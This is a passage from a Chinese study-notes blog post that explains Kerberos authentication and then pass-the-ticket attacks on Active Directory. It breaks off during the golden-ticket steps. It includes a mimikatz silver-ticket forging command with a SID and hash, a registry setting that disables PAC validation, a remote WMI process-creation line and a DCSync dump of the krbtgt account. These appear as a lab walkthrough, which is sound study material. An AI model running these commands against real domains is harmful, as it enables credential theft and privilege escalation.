@@ -1,0 +1,313 @@
+<!DOCTYPE html><html lang="en" mode="light" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Kerberos认证与票据传递" /><meta name="author" content="RingLcy" /><meta property="og:locale" content="en_US" /><meta name="description" content="原理" /><meta property="og:description" content="原理" /><link rel="canonical" href="https://ringlcy.github.io/posts/Kerberos%E8%AE%A4%E8%AF%81%E5%8F%8A%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/" /><meta property="og:url" content="https://ringlcy.github.io/posts/Kerberos%E8%AE%A4%E8%AF%81%E5%8F%8A%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/" /><meta property="og:site_name" content="我的学习笔记" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-31T23:59:52+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Kerberos认证与票据传递" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"RingLcy"},"description":"原理","url":"https://ringlcy.github.io/posts/Kerberos%E8%AE%A4%E8%AF%81%E5%8F%8A%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/","@type":"BlogPosting","headline":"Kerberos认证与票据传递","dateModified":"2020-12-31T23:59:52+08:00","datePublished":"2020-12-31T23:59:52+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ringlcy.github.io/posts/Kerberos%E8%AE%A4%E8%AF%81%E5%8F%8A%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/"},"@context":"https://schema.org"}</script><title>Kerberos认证与票据传递 | 我的学习笔记</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicons/ms-icon-144x144.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">我的学习笔记</a></div><div class="site-subtitle font-italic">种一棵树最好的时间是五年前，其次是现在</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/RingLcy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Kerberos认证与票据传递</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Kerberos认证与票据传递</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Dec 31, 2020, 11:59 PM +0800" > Dec 31, 2020 <i class="unloaded">2020-12-31T23:59:52+08:00</i> </span> by <span class="author"> RingLcy </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3424 words">19 min</span></div></div><div class="post-content"><h1 id="原理"><strong>原理</strong></h1><h2 id="一kerberos认证"><strong>一、Kerberos认证</strong></h2><p>https://www.dazhuanlan.com/2020/02/03/5e3738460a38b/</p><p><a href="https://qili93.github.io/技术解读/2017/03/14/kerebros-auth/">https://qili93.github.io/%E6%8A%80%E6%9C%AF%E8%A7%A3%E8%AF%BB/2017/03/14/kerebros-auth/</a></p><p>https://en.hackndo.com/kerberos/</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/clipboard-1599141212007.png" alt="img" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Visio-KerberosComms.png" alt="Visio-KerberosComms" /></p><h3 id="1-authentication-service-exchange"><strong>1. Authentication Service Exchange</strong></h3><p>。具体过程如下：</p><p>Client向KDC的Authentication Service发送Authentication Service Request（KRB_AS_REQ）, 为了确保KRB_AS_REQ仅限于自己和KDC知道，Client使用自己的Master Key对KRB_AS_REQ的主体部分进行加密（KDC可以通过Domain 的Account Database获得该Client的Master Key）。KRB_AS_REQ的大体包含以下的内容：</p><ul><li><p>Pre-authentication data：包含用以证明自己身份的信息。说白了，就是证明自己知道自己声称的那个account的Password。一般地，它的内容是一个被Client的Master key加密过的Timestamp。</p><li><p>Client name &amp; realm: 简单地说就是Domain name\Client</p><li><p>Server Name：注意这里的Server Name并不是Client真正要访问的Server的名称，而我们也说了TGT是和Server无关的（Client只能使用Ticket，而不是TGT去访问Server）。这里的Server Name实际上是<strong>KDC的Ticket Granting Service的Server Name</strong>。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/kerberos_authentication_service.jpeg" alt="img" /></p></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/clipboard-1599141249879.png" alt="img" /></p><h3 id="2-ticket-granting-service-exchange"><strong>2. Ticket Granting Service Exchange</strong></h3><p>TGS（Ticket Granting Service）Exchange通过Client向KDC中的TGS（Ticket Granting Service）发送Ticket Granting Service Request（KRB_TGS_REQ）开始。KRB_TGS_REQ大体包含以下的内容：</p><ul><li>TGT：Client通过AS Exchange获得的Ticket Granting Ticket，TGT被KDC的Master Key进行加密。<li>Authenticator：用以证明当初TGT的拥有者是否就是自己，所以它必须以TGT的颁发方（KDC）给自己（Client）的Session Key（SKDC-Client：Logon Session Key）来进行加密。<li>Client name &amp; realm: 简单地说就是Domain name\Client。<li>Server name &amp; realm: 简单地说就是Domain name\Server，这回是Client试图访问的那个Server。</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/kerberos_ticket_granting_service.jpeg" alt="img" /></p><p>TGS收到KRB_TGS_REQ在发给Client真正的Ticket之前，先得验证Client提供的那个TGT是否是AS颁发给它的。于是它需要验证Client提供的Authenticator，但是Authentication是通过Logon Session Key（SKDC-Client）进行加密的，而自己并没有保存这个Session Key。所以TGS先得通过自己的Master Key对Client提供的TGT进行解密，从而获得这个Logon Session Key（SKDC-Client），再通过这个Logon Session Key（SKDC-Client）解密Authenticator进行验证。验证通过向对方发送Ticket Granting Service Response（KRB_TGS_REP）。这个KRB_TGS_REP有两部分组成：使用Logon Session Key（SKDC-Client）加密过用于Client和Server的Session Key（SServer-Client）和使用Server的Master Key进行加密的Ticket。该Ticket大体包含以下一些内容：</p><ul><li>Session Key：SServer-Client。<li>Client name &amp; realm: 简单地说就是Domain name\Client。<li>PAC<li>End time: Ticket的到期时间。</ul><p>Client收到KRB_TGS_REP，使用Logon Session Key（SKDC-Client）解密第一部分后获得Session Key（SServer-Client）。有了Session Key和Ticket，Client就可以之间和Server进行交互，而无须在通过KDC作中间人了。</p><h3 id="3-clientserver-exchange"><strong>3. Client/Server Exchange</strong></h3><p>Client通过TGS Exchange获得Client和Server的Session Key（SServer-Client），随后创建用于证明自己就是Ticket的真正所有者的Authenticator，并使用Session Key（SServer-Client）进行加密。最后将这个被加密过的Authenticator和Ticket作为Application Service Request（KRB_AP_REQ）发送给Server。除了上述两项内容之外，KRB_AP_REQ还包含一个Flag用于表示Client是否需要进行双向验证（Mutual Authentication）。</p><p>Server接收到KRB_AP_REQ之后，通过自己的Master Key解密Ticket，从而获得Session Key（SServer-Client）。通过Session Key（SServer-Client）解密Authenticator，进而验证对方的身份，验证成功，让Client访问需要访问的资源，否则直接拒绝对方的请求。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/kerberos_client_server.jpeg" alt="img" /></p><h4 id="细节补充">细节补充：</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Visio-SilverTicket-Comms.png" alt="Visio-SilverTicket-Comms" /></p><h5 id="1-通过pac检查client是否有权限访问请求的资源">1. 通过PAC检查Client是否有权限访问请求的资源</h5><blockquote><p>https://en.hackndo.com/kerberoasting/</p><p>A domain user can ask a domain controller for a TGS for any service. It is not the role of the domain controller to check access rights. The only purpose of the domain controller when asked for a TGS is to provide security information related to a user (via the <a href="https://en.hackndo.com/kerberos-silver-golden-tickets/#pac">PAC</a>). It is the service who must check the user’s rights by reading the PAC provided in the TGS.</p></blockquote><blockquote><p>http://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</p><p>The PAC contains two cryptographic signatures. One signature created with the service’s key and the other created with the KDC’s key. Because of these dual signatures, the PAC is effectively tamper-proof.</p><p>The service will then use its key to check the signature of the PAC. This provides the user’s authorization upfront, so the service doesn’t need to fetch it from the KDC.</p></blockquote><h5 id="2可选server向kdc请求验证pac签名确保pac未被篡改">2.(可选)Server向KDC请求验证PAC签名，确保PAC未被篡改</h5><blockquote><p>http://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</p><p>Optionally, the service may choose to send the PAC to the KDC, so that the KDC may validate the second signature against the KDC’s key. If performed, this optional check verifies that the PAC has not been altered from when it was first created by the KDC and helps prevent attempts to forge the PAC and escalate privileges.</p></blockquote><h5 id="3-可选-client与server双向认证">3. (可选) Client与Server双向认证</h5><blockquote><p>https://qili93.github.io/%E6%8A%80%E6%9C%AF%E8%A7%A3%E8%AF%BB/2017/03/14/kerebros-auth/</p><p>Kerberos一个重要的优势在于它能够提供双向认证：不但Server可以对Client 进行认证，Client也能对Server进行认证。</p><p>具体过程是这样的，如果Client需要对他访问的Server进行认证，会在它向Server发送的Credential中设置一个是否需要认证的Flag。Server在对Client认证成功之后，会把Authenticator中的Timestamp提出出来，通过Session Key进行加密，当Client接收到并使用Session Key进行解密之后，如果确认Timestamp和原来的完全一致，那么他可以认定Server正式他试图访问的Server。</p><p>那么为什么Server不直接把通过Session Key进行加密的Authenticator原样发送给Client，而要把Timestamp提取出来加密发送给Client呢？原因在于防止恶意的监听者通过获取的Client发送的Authenticator冒充Server获得Client的认证。</p></blockquote><h5 id="4-为何要用timestamp">4. 为何要用Timestamp</h5><p>我们试想这样的现象：Client向Server发送的数据包被某个恶意网络监听者截获，该监听者随后将数据包作为自己的Credential冒充该Client对Server进行访问，在这种情况下，依然可以很顺利地获得Server的成功认证。为了解决这个问题，Client在Authenticator中会加入一个当前时间的Timestamp。在Server对Authenticator中的Client Info和Session Ticket中的Client Info进行比较之前，会先提取Authenticator中的Timestamp，并同当前的时间进行比较，如果他们之间的偏差超出一个可以接受的时间范围（一般是5mins），Server会直接拒绝该Client的请求。</p><h2 id="二域账号登陆验证过程"><strong>二、域账号登陆验证过程</strong></h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/clipboard-1599141626197.png" alt="img" /></p><h1 id="pass-the-ticket">Pass the Ticket</h1><p>https://my.oschina.net/u/4349795/blog/3220366</p><p>https://en.hackndo.com/kerberos-silver-golden-tickets/ (一定要看! 为什么黄金票据能伪造成任意用户)</p><p><strong>PAC(Privilege Attribute Certificate)</strong></p><p>TGT和Ticket中都包含PAC，里面描述了Client的SID、所属组，以下是一个TGT中PAC内容示例。</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+</pre><td class="rouge-code"><pre>AuthorizationData item
+    ad-type: AD-Win2k-PAC (128)
+        Type: Logon Info (1)
+            PAC_LOGON_INFO: 01100800cccccccce001000000000000000002006a5c0818...
+                Logon Time: Aug 17, 2018 16:25:05.992202600 Romance Daylight Time
+                Logoff Time: Infinity (absolute time)
+                PWD Last Set: Aug 16, 2018 14:13:10.300710200 Romance Daylight Time
+                PWD Can Change: Aug 17, 2018 14:13:10.300710200 Romance Daylight Time
+                PWD Must Change: Infinity (absolute time)
+                Acct Name: pixis
+                Full Name: pixis
+                Logon Count: 7
+                Bad PW Count: 2
+                User RID: 1102
+                Group RID: 513
+                GROUP_MEMBERSHIP_ARRAY
+                    Referent ID: 0x0002001c
+                    Max Count: 2
+                    GROUP_MEMBERSHIP:
+                        Group RID: 1108
+                        Attributes: 0x00000007
+                            .... .... .... .... .... .... .... .1.. = Enabled: The enabled bit is SET
+                            .... .... .... .... .... .... .... ..1. = Enabled By Default: The ENABLED_BY_DEFAULT bit is SET
+                            .... .... .... .... .... .... .... ...1 = Mandatory: The MANDATORY bit is SET
+                    GROUP_MEMBERSHIP:
+                        Group RID: 513
+                        Attributes: 0x00000007
+                            .... .... .... .... .... .... .... .1.. = Enabled: The enabled bit is SET
+                            .... .... .... .... .... .... .... ..1. = Enabled By Default: The ENABLED_BY_DEFAULT bit is SET
+                            .... .... .... .... .... .... .... ...1 = Mandatory: The MANDATORY bit is SET
+                User Flags: 0x00000020
+                User Session Key: 00000000000000000000000000000000
+                Server: DC2016
+                Domain: HACKNDO
+                SID pointer:
+                    Domain SID: S-1-5-21-3643611871-2386784019-710848469  (Domain SID)
+                User Account Control: 0x00000210
+                    .... .... .... ...0 .... .... .... .... = Don't Require PreAuth: This account REQUIRES preauthentication
+                    .... .... .... .... 0... .... .... .... = Use DES Key Only: This account does NOT have to use_des_key_only
+                    .... .... .... .... .0.. .... .... .... = Not Delegated: This might have been delegated
+                    .... .... .... .... ..0. .... .... .... = Trusted For Delegation: This account is NOT trusted_for_delegation
+                    .... .... .... .... ...0 .... .... .... = SmartCard Required: This account does NOT require_smartcard to authenticate
+                    .... .... .... .... .... 0... .... .... = Encrypted Text Password Allowed: This account does NOT allow encrypted_text_password
+                    .... .... .... .... .... .0.. .... .... = Account Auto Locked: This account is NOT auto_locked
+                    .... .... .... .... .... ..1. .... .... = Don't Expire Password: This account DOESN'T_EXPIRE_PASSWORDs
+                    .... .... .... .... .... ...0 .... .... = Server Trust Account: This account is NOT a server_trust_account
+                    .... .... .... .... .... .... 0... .... = Workstation Trust Account: This account is NOT a workstation_trust_account
+                    .... .... .... .... .... .... .0.. .... = Interdomain trust Account: This account is NOT an interdomain_trust_account
+                    .... .... .... .... .... .... ..0. .... = MNS Logon Account: This account is NOT a mns_logon_account
+                    .... .... .... .... .... .... ...1 .... = Normal Account: This account is a NORMAL_ACCOUNT
+                    .... .... .... .... .... .... .... 0... = Temp Duplicate Account: This account is NOT a temp_duplicate_account
+                    .... .... .... .... .... .... .... .0.. = Password Not Required: This account REQUIRES a password
+                    .... .... .... .... .... .... .... ..0. = Home Directory Required: This account does NOT require_home_directory
+                    .... .... .... .... .... .... .... ...0 = Account Disabled: This account is NOT disabled
+</pre></table></code></div></div><h2 id="白银票据"><strong>白银票据</strong></h2><p>Ticket中的PAC是双重签名的，第一个由server账户签名，第二个由krbtgt 账户签名。我们无法伪造krbtgt账户的签名，但是当server收到ticket的时候，它通常只验证第一个签名，不会去找KDC验证krbtgt账户的签名，从而我们可以伪造ticket通过认证。或者通过设置如下注册表，让server不请求KDC验证PAC:</p><p><em>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</em></p><p><em>DWORD Value Name: ValidateKdcPacSignature</em></p><p>When the DWORD value of this entry is 0, Kerberos does not perform PAC validation on a process that runs as a service.</p><p>白银票据不会与DC通信，因此相比黄金票据更隐蔽，是一种很好的权限维持手段；</p><h3 id="白银票据例子"><a href="https://adsecurity.org/?p=2011">白银票据例子</a>：</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>kerberos::golden /domain:ring2.com /sid:S-1-5-21-2475887593-94489213-2292866110 /target:win10-pc2.ring2.com /service:cifs /rc4:0b247d5c4f73feec13228f650b71ac5f /user:test /ptt
+</pre></table></code></div></div><h4 id="1-利用cifs服务操作windows-admin-share">1. 利用CIFS服务，操作windows admin share</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-CIFS.png" alt="SilverTicket-DC-CIFS" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-CIFS-Exploit.png" alt="SilverTicket-DC-CIFS-Exploit" /></p><h4 id="2-利用host服务操作计划任务">2. 利用HOST服务，操作计划任务</h4><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-HOST.png" alt="SilverTicket-DC-HOST" /></p><p>Leveraging the HOST Silver Ticket, we can create a new scheduled task.</p><p><a href="https://adsecurity.org/wp-content/uploads/2015/11/SilverTicket-DC-HOST-Exploit01.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-HOST-Exploit01.png" alt="SilverTicket-DC-HOST-Exploit01" /></a></p><p>Or by leveraging the HOST Silver Ticket, we can <em>modify</em> an exist scheduled task.</p><p><a href="https://adsecurity.org/wp-content/uploads/2015/11/SilverTicket-DC-HOST-Exploit02.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-HOST-Exploit02.png" alt="SilverTicket-DC-HOST-Exploit02" /></a></p><p>Check to see if the scheduled task was set. Yes, it’s there!</p><p><a href="https://adsecurity.org/wp-content/uploads/2015/11/SilverTicket-DC-HOST-Exploit03.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-HOST-Exploit03.png" alt="SilverTicket-DC-HOST-Exploit03" /></a></p><h4 id="3-利用httpwsman服务调用winrm">3. 利用http&amp;wsman服务，调用winrm</h4><p><a href="https://adsecurity.org/wp-content/uploads/2015/11/SilverTicket-DC-HTTP.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-HTTP.png" alt="SilverTicket-DC-HTTP" /></a></p><p><a href="https://adsecurity.org/wp-content/uploads/2015/11/SilverTicket-DC-WSMAN.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-WSMAN.png" alt="SilverTicket-DC-WSMAN" /></a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/PowerShell-Remoting-Connect-To-ADSDC02.jpg" alt="PowerShell-Remoting-Connect-To-ADSDC02" /></p><h4 id="4-利用hostrpcss服务执行wmi">4. 利用host&amp;rpcss服务执行WMI</h4><p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-adsdc02-Host.jpg" alt="SilverTicket-adsdc02-Host" /></p><p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-adsdc02-rpcss.jpg" alt="SilverTicket-adsdc02-rpcss" />(https://adsecurity.org/wp-content/uploads/2015/11/SilverTicket-adsdc02-rpcss.jpg)</p><p><code class="language-plaintext highlighter-rouge">Invoke-WmiMethod win32_process -ComputerName $Computer -Credential $Creds -name create -argumentlist “$RunCommand”</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/WMIC-PTT-Remote-VSS-Copy-NTDSdit.png" alt="WMIC-PTT-Remote-VSS-Copy-NTDSdit" /></p><h4 id="5-利用ldap服务执行dcsync">5. 利用LDAP服务执行DCSync</h4><p>这个例子的重点不在于最后做DCSync，而是演示用DC$密码后利用白银票据保持对AD的高操作权限。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-LDAP.png" alt="SilverTicket-DC-LDAP" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/SilverTicket-DC-LDAP-Exploit-DCSync.png" alt="SilverTicket-DC-LDAP-Exploit-DCSync" /></p><h2 id="黄金票据"><strong>黄金票据</strong></h2><p>知道krbtgt Hash后可伪造TGT，说本账号属于Domain Admins等管理员组。域控制器中的KDC服务不验证TGT中的用户帐户，直到<a href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</p><blockquote><p>微软的MS-KILE解释：Kerberos V5不提供对TGS请求的帐户撤销检查，只要TGT有效，即使该帐户已被删除，TGT更新和服务票据也可以发布。KILE提供了一个可以将利用时间限制在较短的时间内（20分内）。当TGT大于20分钟时，KILE KDC需要在域中检查账户。</p></blockquote><p>黄金票据的条件要求：</p><ul><li>域名称<li>域的SID 值<li>域的KRBTGT账户NTLM密码哈希或者aes-256值<li>伪造用户名 administrator</ul><p>mimikatz会根据我们传入的域SID，自动为我们拼接成以下SID，从而伪装具有下列权限的账户。</p><p>黄金票默认组：</p><ul><li><p>域用户SID：S-1-5-21 <DOMAINID> -513</DOMAINID></p><li><p>域管理员SID：S-1-5-21 <DOMAINID> -512</DOMAINID></p><li><p>架构管理员SID：S-1-5-21 <DOMAINID> -518</DOMAINID></p><li><p>企业管理员SID：S-1-5-21 <DOMAINID> -519（对于有多个子域的域林，企业管理员的Domain SID只在森林根域中，所以传入子域的Domain SID是无法伪造企业管理员账户的，可以使用/sids参数将域林管理员SID添加到SID History中，权限进一步从子域提升到整个域林）</DOMAINID></p><li><p>组策略创建者所有者SID：S-1-5-21 <DOMAINID> -520</DOMAINID></p></ul><p><strong>step 1. 获取domain name</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>C:\Users\win10&gt;ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : win10-pc
+   Primary Dns Suffix  . . . . . . . : ring2.com
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : ring2.com
+</pre></table></code></div></div><p><strong>step 2. 获取域SID</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>C:\Users\win10&gt;whoami /all
+
+USER INFORMATION
+----------------
+
+User Name   SID
+=========== ============================================
+ring2\win10 S-1-5-21-2475887593-94489213-2292866110-1103
+</pre></table></code></div></div><p><strong>step 3. 获取krbtgt hash</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>mimikatz # lsadump::dcsync /user:krbtgt
+[DC] 'ring2.com' will be the domain
+[DC] 'ringdc-pc.ring2.com' will be the DC server
+[DC] 'krbtgt' will be the user account
